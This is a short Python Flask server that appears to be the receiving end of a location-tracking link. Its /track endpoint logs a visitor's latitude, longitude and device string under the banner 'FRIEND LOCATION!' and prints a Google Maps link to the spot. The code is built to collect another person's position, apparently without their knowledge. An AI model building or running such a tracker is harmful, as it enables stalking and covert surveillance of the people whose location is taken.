



from flask import Flask, request
app = Flask(__name__)
@app.route('/track')
def track():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    dev = request.args.get('dev', 'Unknown')
    print(f"\n🎯 FRIEND LOCATION!")
    print(f"📍 Lat: {lat}, Lon: {lon}")
    print(f"📱 Device: {dev[:100]}")
    print(f"🗺️  Google: https://maps.google.com/?q={lat},{lon}")
    print("-" * 50)
    return "OK"
app.run(host='0.0.0.0', port=8080, debug=False)
